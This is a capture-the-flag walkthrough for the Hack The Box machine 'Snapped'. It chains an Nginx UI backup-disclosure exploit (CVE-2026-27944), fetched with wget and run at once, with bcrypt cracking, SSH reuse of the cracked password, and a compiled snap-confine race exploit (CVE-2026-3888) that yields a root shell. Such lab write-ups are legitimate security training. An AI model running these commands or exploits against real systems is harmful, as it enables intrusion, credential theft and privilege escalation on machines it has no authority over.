# Target
| Category          | Details                                                                                                                                                  |
|-------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Snapped](https://app.hackthebox.com/machines/Snapped)                                                                                                   |  
| 🏷 **Type**       | HTB Machine                                                                                                                                              |
| 🖥 **OS**         | Linux                                                                                                                                                    |
| 🎯 **Difficulty** | Hard                                                                                                                                                     |
| 📁 **Tags**       | Nginx UI 2.3.2, [CVE-2026-27944](https://nvd.nist.gov/vuln/detail/CVE-2026-27944), snap, [CVE-2026-3888](https://nvd.nist.gov/vuln/detail/CVE-2026-3888) |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 14:35 +0200
Nmap scan report for 10.129.21.37
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.16 seconds
```

#### Add `snapped.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ echo "$TARGET snapped.htb" | sudo tee -a /etc/hosts             
10.129.21.37 snapped.htb
```

#### Enumerate virtual hosts
```
┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ gobuster vhost --url http://$TARGET --wordlist /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ad --domain snapped.htb
<SNIP>
admin.snapped.htb Status: 200 [Size: 1407]
<SNIP>
```

#### Add `admin.snapped.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ echo "$TARGET admin.snapped.htb" | sudo tee -a /etc/hosts
10.129.21.37 admin.snapped.htb
```

#### Identify Nginx UI 2.3.2 running on target
```
┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ curl -s http://admin.snapped.htb/ | grep title         
  <meta name="apple-mobile-web-app-title" content="Nginx UI">
  <title>Nginx UI</title>
                                                          
┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ curl -s http://admin.snapped.htb/assets/ | grep version
<a href="version-BWPlJ0ga.js">version-BWPlJ0ga.js</a>
<a href="version-CdjIlmL0.js">version-CdjIlmL0.js</a>

┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ curl -s http://admin.snapped.htb/assets/version-BWPlJ0ga.js
const t="2.3.2";const o={version:t,build_id:1,total_build:512};export{o as a,t as v};
```
This version is vulnerable to [CVE-2026-27944](https://nvd.nist.gov/vuln/detail/CVE-2026-27944)

#### Exploit [CVE-2026-27944](https://nvd.nist.gov/vuln/detail/CVE-2026-27944) to dump user credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ wget -q https://raw.githubusercontent.com/vulhub/vulhub/refs/heads/master/nginx-ui/CVE-2026-27944/poc.py -O CVE-2026-27944.py && \
python3 CVE-2026-27944.py -u http://admin.snapped.htb
[*] Target: http://admin.snapped.htb
[*] Output: /tmp/nginx-ui-backup-hu0ii6h3

[*] Requesting backup from http://admin.snapped.htb/api/backup
[+] Downloaded backup: 18306 bytes
[+] X-Backup-Security: hPBTj4S4upQpMaghP78XxZLybTc6x3xNdG9x7H1gxos=:cWI+n5FHQh/D0YEwTRr9Qw==
[+] AES Key (256-bit): 84f0538f84b8ba942931a8213fbf17c592f26d373ac77c4d746f71ec7d60c68b
[+] AES IV  (128-bit): 71623e9f9147421fc3d181304d1afd43
[+] Decrypted: hash_info.txt (199 bytes)
[+] Decrypted: nginx-ui.zip (7688 bytes)
[+] Decrypted: nginx.zip (9936 bytes)
<SNIP>
[+] === Users from database ===
    ID=1  Name=admin  Password=$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
    ID=2  Name=jonathan  Password=$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
<SNIP>
```

#### Use `hashcat` to break discovered hashes
```
┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ { cat <<'EOF'> hashes
$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
EOF
} && hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --quiet
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
```

#### Reuse `jonathan:linkinpark` credentials to access target over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ ssh jonathan@snapped.htb
jonathan@snapped.htb's password: 
<SNIP>
jonathan@snapped:~$ id
uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
```

#### Capture user flag
```
jonathan@snapped:~$ cat /home/jonathan/user.txt 
d093a73e9e5133036e8df32742ecc397
```

### Root flag

#### Check `snap` version
```
jonathan@snapped:~$ snap --version
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic
```
This version is vulnerable to [CVE-2026-3888](https://nvd.nist.gov/vuln/detail/CVE-2026-3888).

#### Exploit [CVE-2026-3888](https://nvd.nist.gov/vuln/detail/CVE-2026-3888) to escalate to `root`
[TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE.git](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE.git) has been used
```
┌──(magicrc㉿perun)-[~/attack/HTB Snapped]
└─$ git clone -q https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE.git CVE-2026-3888 && \
gcc -O2 -static -o exploit ./CVE-2026-3888/exploit_caps.c 2>/dev/null && \
gcc -shared -fPIC -nostartfiles -o librootshell.so ./CVE-2026-3888/librootshell_caps.c && \
scp -q exploit librootshell.so jonathan@snapped.htb:~/
jonathan@snapped.htb's password:
```
```
jonathan@snapped:~$ ./exploit ./librootshell.so
================================================================
CVE-2026-3888 — snap-confine / systemd-tmpfiles Capabilities LPE 
================================================================
[*] Payload: /home/jonathan/./librootshell.so (14320 bytes)

[Phase 1] Entering snap-store sandbox...
[+] Inner shell PID: 5331

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 10 days on Ubuntu 25.10).
[*] Hint: use -s to skip.
[+] .snap deleted.

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_UuEpw0//dev: No such file or directory
[+] Namespace destroyed (.mnt gone).

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/5331/cwd
[*]   Building .snap and .exchange...
[*]   17 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 5670)...

[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[+]   Race won. /var/lib/snapd is now user-owned.

[Phase 5] Setting up payload and user-fstab...
[*]   Copying /etc to .snap/etc...
[*]   Writing ld.so.preload...
[*]   Writing user-fstab...
[*]   Copying librootshell.so to /tmp/...
[*]   Copying busybox...
[*]   Writing escape script...
[*]   Swapping var/lib back (restoring original snapd metadata)...
[+]   Payload ready.

[Phase 6] Triggering root via SUID binary in /tmp/.snap...
[*]   Executing: snap-confine → /tmp/.snap/var/lib/snapd/hostfs/snap/core22/current/usr/bin/su
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/snap-store/common/bash (mode 4755)
[*] Cleaning up background processes...

================================================================
  ROOT SHELL: /var/snap/snap-store/common/bash -p
================================================================

bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
```
Since this exploitation is race based it might be required to re-run it. 

#### Capture root flag
```
bash-5.1# cat /root/root.txt 
9a05a0d5494fcf202c1cca1f5f0de02f
```
